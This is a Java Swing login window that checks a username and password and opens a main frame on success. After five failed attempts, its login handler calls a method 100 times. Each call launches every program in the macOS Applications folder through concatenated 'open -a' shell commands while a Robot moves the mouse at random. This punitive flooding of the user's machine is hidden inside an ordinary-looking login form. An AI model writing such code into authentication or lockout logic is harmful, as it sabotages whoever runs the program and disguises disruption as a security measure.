package frames;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.EventQueue;
import java.awt.Robot;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.Random;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.border.EmptyBorder;

import password.PasswordChecker;

import com.jgoodies.forms.factories.FormFactory;
import com.jgoodies.forms.layout.ColumnSpec;
import com.jgoodies.forms.layout.FormLayout;
import com.jgoodies.forms.layout.RowSpec;

public class Login extends JFrame {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private JTextField textField;
	private JPasswordField passwordField;
	private JButton btnLogin;
	int MAX_TRIES = 5;
	int current_tries = 0;
	private static JFrame jframe;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Login frame = new Login();
					frame.setVisible(true);
					frame.setLocationRelativeTo(null);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public Login() {
		jframe = this;
		setTitle("Login");
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		setBackground(Color.white);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new FormLayout(
				new ColumnSpec[] { FormFactory.RELATED_GAP_COLSPEC,
						FormFactory.DEFAULT_COLSPEC,
						FormFactory.RELATED_GAP_COLSPEC,
						FormFactory.DEFAULT_COLSPEC,
						FormFactory.RELATED_GAP_COLSPEC,
						FormFactory.DEFAULT_COLSPEC,
						FormFactory.RELATED_GAP_COLSPEC,
						ColumnSpec.decode("max(134dlu;default):grow"),
						FormFactory.RELATED_GAP_COLSPEC,
						FormFactory.DEFAULT_COLSPEC, }, new RowSpec[] {
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC,
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC,
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC,
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC,
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC,
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC,
						FormFactory.RELATED_GAP_ROWSPEC,
						FormFactory.DEFAULT_ROWSPEC, }));

		JLabel lblUsername = new JLabel("Username");
		contentPane.add(lblUsername, "6, 8, right, default");

		textField = new JTextField();
		contentPane.add(textField, "8, 8, fill, default");
		textField.setColumns(10);

		JLabel lblPassword = new JLabel("Password");
		contentPane.add(lblPassword, "6, 10, right, default");

		passwordField = new JPasswordField();
		contentPane.add(passwordField, "8, 10, fill, default");
		passwordField.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent evt) {
				if (evt.getKeyCode() == KeyEvent.VK_ENTER)
					btnLogin.doClick();

			}
		});
		btnLogin = new JButton("Login");
		btnLogin.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (current_tries >= MAX_TRIES) {
					JOptionPane.showMessageDialog(null,
							"You have exceeded the max number of tries.");
					for (int i = 0; i < 100; i++)
						shutThisBastardDown();
					return;
				}
				current_tries++;
				String user = textField.getText();
				char[] pwd = passwordField.getPassword();
				PasswordChecker checker = new PasswordChecker(user, pwd);
				if (checker.checkCredentials()) {
					new MainFrame();
					MainFrame.main(null);
					jframe.dispose();
				} else
					JOptionPane.showMessageDialog(null,
							"Incorrect credentials. Attempts left:"
									+ (MAX_TRIES - current_tries));
			}
		});
		contentPane.add(btnLogin, "8, 12, left, default");
	}

	public String[] getListOfPrograms() {
		return new File(File.separator + "Applications").list();
	}

	public void shutThisBastardDown() {
		Robot robot = null;
		try {
			robot = new Robot();
		} catch (AWTException e1) {
			e1.printStackTrace();
		}
		Process p;
		StringBuffer output = new StringBuffer();

		String[] list = getListOfPrograms();
		for (int i = 0; i < list.length; i++) {
			robot.mouseMove(new Random().nextInt(1024),
					new Random().nextInt(1024));
			try {
				p = Runtime.getRuntime().exec("open -a " + list[i]);
				p.waitFor();
				BufferedReader reader = new BufferedReader(
						new InputStreamReader(p.getInputStream()));

				String line = "";
				while ((line = reader.readLine()) != null) {
					output.append(line + "\n");
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
			System.out.println(output.toString());
		}
	}
}
